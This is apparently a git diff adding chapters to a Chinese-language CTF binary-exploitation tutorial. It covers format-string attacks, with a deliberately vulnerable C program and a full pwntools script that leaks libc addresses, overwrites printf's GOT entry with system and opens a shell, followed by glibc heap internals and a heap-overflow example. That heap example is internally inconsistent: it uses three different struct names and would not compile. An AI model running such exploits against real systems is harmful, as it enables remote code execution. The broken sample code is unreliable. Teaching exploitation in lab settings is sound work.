@@ -2461,21 +2461,284 @@ int main()
 
 ### 5.3 基本利用方式
 
+通过格式化字符串漏洞可以进行任意内存的读写。
+
+由于函数参数通过栈进行传递，因此使用 `%X$p`（X 为任意整数）可以泄露栈上的数据。在能对栈上数据进行控制的情况下，可以事先将想泄露的地址写在栈上，再使用  `%X$p`，就可以以字符串格式输出想泄露的地址。
+
+由于 `%n` 可以将已经成功输出的字符个数写入对应的整形指针参数所指的变量，因此可以事先再在栈上布置想要写入的内存的地址。再通过 `%Yc%X$n`（Y 为想要写入的数据）就可以进行任意内存写。
+
+#### 示例-5.3.1：格式化字符串漏洞基本利用
+
+```c
+#include<stdio.h>
+#include<unistd.h>
+
+int main(){
+    setbuf(stdin, 0);
+    setbuf(stdout, 0);
+    setbuf(stderr, 0);
+    while(1){
+        char format[100];
+        puts("input your name:");
+        read(0, format, 100);
+        printf("hello ");
+        printf(format);
+    }
+    return 0;
+}
+```
+
+Ubuntu 16.04 用如下命令编译：
+
+```
+gcc fsb.c -o fsb -fstack-protector-all -pie -fPIE -z lazy
+```
+
+在 printf 设置断点，此时 RSP 正好在输入字符串的位置，即第 6 个参数的位置（64 位 Linux 前 5 个参数和格式化字符串由寄存器传递）。输入 `AAAAAAAA%6$p`，可以看到程序将输入的 8 个 A 当作指针型变量输出了，可以进行信息泄露。
+
+```
+$ ./fsb
+input your name:
+AAAAAAAA%6$p
+hello AAAAAAAA0x4141414141414141
+```
+
+栈中有 `__libc_start_main` 调用 `__libc_csu_init` 前压入的返回地址。
+
+IDA 中的视图：
+
+![image-20230508170059390](images/image-20230508170059390.png)
+
+Pwndbg 中的视图：
+
+![image-20230508170214582](images/image-20230508170214582.png)
+
+`0x7fffffffde08` 在第7个参数的位置， `__libc_start_main+240` 在第 21 个参数的位置，根据这个地址，可以计算出 libc 的基地址：
+
+```
+libc_base = addr - libc.symbols['__libc_start_main']-0xf0
+info("libc:0x%x", libc_base)
+```
+
+同理，`_start` 在第 17 个参数的位置，根据这个地址，可以计算出 fsb 程序的基地址：
+
+```
+base = addr - elf.symbols['_start']
+info("base:0x%x", base)
+```
+
+进行以上基地址计算前，首先需要将第 17 个、第 21 个参数位置的信息进行泄露：
+
+```
+$ ./fsb
+input your name:
+%17$p%21$p
+hello 0x561e388897c00x7feb3e68a840
+```
+
+有了 libc 基地址之后，就可以计算 system 函数的地址，然后将 GOT 表中 printf 函数的地址修改为 system 函数的地址。下一次执行 printf(format)时，实际会执行 system(format)，输入的format为 `/bin/bash` 即可获得 shell。
+
+GOT 表中 printf 函数的地址为 `0x201028`，可以用以下两种方式寻找。
+
+方式一，在利用脚本中通过 `elf.got` 寻找：
+
+```
+elf.got['printf']
+```
+
+方式二，直接在反编译窗口寻找：
+
+![image-20230508172514749](images/image-20230508172514749.png)
+
+利用脚本如下（原题目是在 Ubuntu 18.04 下编译，libc 为 libc-2.27.so，此处在 Ubuntu 16.04 下编译，libc 改用 libc-2.23.so）：
+
+```python
+# python2
+from pwn import *
+elf = ELF('./fsb')
+libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
+p = process('./fsb')
+p.recvuntil('name:')
+p.sendline('%17$p%21$p')
+p.recvuntil('0x')
+
+# 计算 fsb 程序基地址，即 _start 函数地址
+addr = int(p.recvuntil('0x')[:-2],16)
+base = addr - elf.symbols['_start']
+info("base:0x%x", base)
+addr = int(p.recvuntil('\n')[:-1],16)
+
+# 计算 libc 基地址
+libc_base = addr - libc.symbols['__libc_start_main']-0xf0
+info("libc:0x%x", libc_base)
+
+# 计算 system 函数地址
+system = libc_base + libc.symbols['system']
+info("system:0x%x", system)
+
+# 将 system 地址拆分为 3 个 word
+ch0 = system&0xffff
+ch1 = (((system>>16)&0xffff)-ch0)&0xffff
+ch2 = (((system>>32)&0xffff)-(ch0+ch1))&0xffff
+
+# 3 个地址要放在 payload 最后
+payload = "%" + str(ch0) + "c%12$hn"
+payload += "%" + str(ch1) + "c%13$hn"
+payload += "%" + str(ch2) + "c%14$hn"
+payload = payload.ljust(48,'a')
+
+# 将 GOT 表中 printf 函数地址修改为 system 函数地址
+info("printf:0x%x", elf.got['printf'])
+payload += p64(base+elf.got['printf'])
+payload += p64(base+elf.got['printf']+2)
+payload += p64(base+elf.got['printf']+4)
+
+p.sendline(payload)
+p.sendline(b"/bin/sh\x00")
+p.interactive()
+```
+
+脚本将 system 的地址（6 字节）拆分为 3 个 word（2 字节），是因为如果一次性输出一个 int 型以上的字节，printf 会输出几 GB 的数据，在攻击远程服务器时速度很慢，或导致 broken pipe。
+
+注意，在 64 位的程序中，地址往往只占 6 字节，高位的 2 字节必然是 `\x00`，所以 3 个地址一定要放在 payload 最后，而不是放在最前面。虽然放在最前面偏移量更好计算，但是 printf 输出字符串时到 `\x00` 为止，地址中的 `\x00` 会截断字符串，之后用于写入地址的占位符并不会生效。
+
 ### 5.4 不在栈上的利用方式
+
+（待补）
 
 ### 5.5 一些特殊用法
 
+（待补）
+
 ### 5.6 总结
+
+（待补）
 
 ## 第 6 章 堆利用
 
 ### 6.1 什么是堆
 
+堆（chunk）内存是一种允许程序在运行过程中动态分配和使用的内存区域。相比于栈内存和全局内存，堆内存没有固定的声明周期和固定的内存区域，程序可以动态地申请和释放不同大小的内存。被分配后，如果没有进行明确的释放操作，该堆内存区域都是一直有效的。
+
+为了进行高效的堆内存分配、回收和管理，Glibc 实现了 Ptmalloc2 的堆管理器。本节主要介绍 Ptmalloc2 堆管理器缺陷的分析和利用。这里只介绍 Glibc 2.25 版本最基本的结构和概念，以及 2.26 版本的新加入特性。
+
+Ptmalloc2 堆管理器分配的最基本内存结构为 chunk。chunk 基本的数据结构如下：
+
+```c
+struct malloc_chunk {
+  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};
+```
+
+其中，mchunk_size 记录了当前 chunk 的大小，chunk 的大小都是 8 字节对齐，所以 mchunk_size 的低 3 位固定为 0。为了充分利用内存空间，mchunk_size 的低 3 位分别存储 PREV_INUSE、IS_MAPPED、NON_MAIN_ARENA 信息，堆管理器可以通过这些信息找到前一个被释放 chunk 的位置。
+
+- NON_MAIN_ARENA：记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。
+- IS_MAPPED：记录当前 chunk 是否是由 mmap 分配的。
+- PREV_INUSE：记录前一个 chunk 块是否被分配，如果与当前 chunk 向上相邻的 chunk 为被释放的状态，则该标志位为 0，并且 mchunk_prev_size 的大小为该被释放的相邻 chunk 的大小。
+
+chunk 在管理器中有 3 种形式，分别为 allocated chunk、free chunk、top chunk。在 64 位系统中，chunk 结构最小为 32（0x20）字节。
+
+- allocated chunk：当用户申请一块内存后，堆管理器会返回一个 allocated chunk，其结构为 mchunk_prevsize + mchunk_size + user_memory。user_memory 为可被用户使用的内存空间。
+- free chunk：为 allocated chunk 被释放后的存在形式。
+- top chunk：是一个非常大的 free chunk，如果用户申请内存大小比 top chunk 小，则由 top chunk 分割产生。
+
+为了高效地分配内存并尽量避免内存碎片，Ptmalloc2 将不同大小的 free chunk 分为不同 bin 结构，分别为 Fast Bin、Small bin、Unsorted Bin、Large Bin。
+
+#### 6.1.1 Fast Bin
+
+Fast Bin 分类的 chunk 的大小为 32-128（0x80）字节，如果 chunk 在被释放时发现其大小满足这个要求，则将该 chunk 放入 Fast Bin，且在被释放后不修改下一个 chunk 的 PREV_INUSE 标志位。
+
+Fast Bin 在堆管理器中以单链表的形式存储，不同大小的 Fast Bin 存储在对应大小的单链表结构中，其单链表的存取机制是 LIFO（后进先出）。
+
+一个最新被加入 Fast Bin 的 chunk，其 fd 指针指向上一次加入的 Fast Bin 的 chunk。
+
+#### 6.1.2 Small Bin
+
+Small Bin 分类的 chunk 的大小为32-1024（0x400）字节的 chunk，每个放入其中的 chunk 为双链表结构，不同大小的 chunk 存储在对应的链接中。
+
+由于是双链表结构，其速度比 Fast Bin 慢一些，其存取机制是 FIFO（先进先出）。
+
+#### 6.1.3 Unsorted Bin
+
+Unsorted Bin 相当于 Ptmalloc2 堆管理器的垃圾桶。chunk 被释放后，会先加入 Unsorted Bin 中，等待下次分配使用。在堆管理器的 Unsorted Bin 不为空时，用户申请非 Fast Bin 大小的内存会先从 Unsorted Bin 中查找，如果找到符合该申请大小要求的 chunk（等于或者大于），则直接分配或者分割该chunk。
+
+#### 6.1.4 Large Bin
+
+大于 1024（0x400）字节的 chunk 使用 Large Bin 进行管理。Large Bin 的结构相对于其他 Bin 是最复杂的，速度也是最慢的，相同大小的 Large Bin 使用 fd 和 bk 指针连接，不同大小的 Large Bin 通过 fd_nextsize 和 bk_nextsize 按大小排序连接。
+
 ### 6.2 简单的堆溢出
+
+堆溢出是最简单也是最直接的软件漏洞。堆通常会存储各种结构体，通过堆溢出覆盖结构体进而篡改结构体信息，往往可以造成远程代码执行等严重漏洞。
+
+示例：
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+
+struct AA {
+    char buf[0x20];
+    void (*func)(char*);
+};
+
+void out(char *buf) {
+    puts(buf);
+}
+
+void vuln() {
+    struct AAA *a =  malloc(sizeof(struct A));
+    a->func = out;
+    read(0, a->buf, 0x30);
+    a->func(a->buf);
+}
+
+void main() {
+    vuln();
+}
+```
+
+以上示例中，结构体 AAA 中 buf 的大小为 32 字节，但读入了 48 字节的字符，过长的字符直接覆盖了结构体中的函数指针，进而调用该函数指针时实现了对程序控制流的劫持。
 
 ### 6.3 堆内存破坏漏洞利用
 
+工具：
+
+- https://github.com/pwndbg/pwndbg
+- https://github.com/shellphish/how2heap
+
 #### 6.3.1 Glibc 调试环境搭建
+
+以 Ubuntu 16.04 为例，搭建 Glib从源码调试环境。安装源码包：
+
+```
+apt install glibc-source
+```
+
+在 `/usr/src/glibc` 中找到 `glibc-2.23.tar.xz` 文件，解压文件：
+
+```
+tar xf /usr/src/glibc/glibc-2.23.tar.xz 
+```
+
+在 GDB 中使用 dir 命令设置源码搜索路径：
+
+```
+pwndbg> dir /usr/src/glibc/glibc-2.23/malloc
+Source directories searched: /usr/src/glibc/glibc-2.23/malloc:$cdir:$cwd
+```
+
+这样可以在源码级别调试 Glibc 源码。可以在 `~/.gdbinit` 中加入以下命令设置源码路径：
+
+```
+dir /usr/src/glibc/glibc-2.23/malloc
+```
 
 #### 6.3.2 Fast Bin Attack
 
